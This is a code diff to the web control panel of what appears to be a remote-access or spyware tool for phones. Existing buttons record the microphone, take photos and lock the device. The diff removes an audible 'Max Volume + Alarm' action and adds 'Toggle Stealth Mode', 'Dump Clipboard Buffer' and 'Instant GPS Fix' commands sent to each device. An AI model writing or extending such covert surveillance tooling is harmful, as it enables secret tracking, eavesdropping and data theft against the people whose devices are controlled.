@@ -490,8 +490,10 @@ app.get('/', (req, res) => {
                         <button onclick="dispatchQuickCommand('${d.deviceId}', 'lock')" class="btn btn-small" title="Toggle Lock" style="${lockStyle} padding: 4px 8px; font-size: 0.6rem; margin: 0; border-radius: 4px; cursor: pointer;">🔒</button>
                         <button onclick="dispatchQuickCommand('${d.deviceId}', 'flashlight')" class="btn btn-small" title="Toggle Flashlight" style="${lightStyle} padding: 4px 8px; font-size: 0.6rem; margin: 0; border-radius: 4px; cursor: pointer;">🔦</button>
                         <button onclick="dispatchQuickCommand('${d.deviceId}', 'mic')" class="btn btn-small" title="Record Mic (60s)" style="${micStyle} padding: 4px 8px; font-size: 0.6rem; margin: 0; border-radius: 4px; cursor: pointer;">🎙️</button>
-                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'volume')" class="btn btn-small" title="Max Volume + Alarm" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 8px; font-size: 0.6rem; margin: 0; border-radius: 4px; cursor: pointer;">🔊</button>
                         <button onclick="dispatchQuickCommand('${d.deviceId}', 'photo')" class="btn btn-small" title="Quick Photo (Rear)" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 8px; font-size: 0.6rem; margin: 0; border-radius: 4px; cursor: pointer;">📷</button>
+                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'stealth')" class="btn btn-small" title="Toggle Stealth Mode" style="background: rgba(255,157,0,0.05); color: var(--neon-orange); border-color: var(--neon-orange); padding: 4px 8px; font-size: 0.6rem; margin: 0; border-radius: 4px; cursor: pointer;">👁️</button>
+                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'clipboard')" class="btn btn-small" title="Dump Clipboard Buffer" style="background: rgba(0,242,255,0.05); color: var(--neon-cyan); border-color: rgba(0,242,255,0.3); padding: 4px 8px; font-size: 0.6rem; margin: 0; border-radius: 4px; cursor: pointer;">📋</button>
+                        <button onclick="dispatchQuickCommand('${d.deviceId}', 'gps')" class="btn btn-small" title="Instant GPS Fix" style="background: rgba(57,255,20,0.05); color: var(--neon-green); border-color: var(--neon-green); padding: 4px 8px; font-size: 0.6rem; margin: 0; border-radius: 4px; cursor: pointer;">🛰️</button>
                     </div>
                 </td>
             </tr>
@@ -642,12 +644,18 @@ app.get('/', (req, res) => {
         } else if (action === 'lock') {
             path = '/ghost/lock';
             label = 'Toggle System Lock';
-        } else if (action === 'volume') {
-            path = '/device/max-volume';
-            label = 'Max Volume & Alarm';
         } else if (action === 'photo') {
             path = '/camera/photo?cam=0';
             label = 'Quick Photo (Rear)';
+        } else if (action === 'stealth') {
+            path = '/stealth/toggle';
+            label = 'Toggle Stealth Mode';
+        } else if (action === 'clipboard') {
+            path = '/clipboard';
+            label = 'Dump Clipboard Buffer';
+        } else if (action === 'gps') {
+            path = '/gps/locate?json=true';
+            label = 'Instant GPS Fix';
         }
 
         const fullUrl = '/proxy' + path + (path.includes('?') ? '&' : '?') + 'deviceId=' + encodeURIComponent(deviceId);
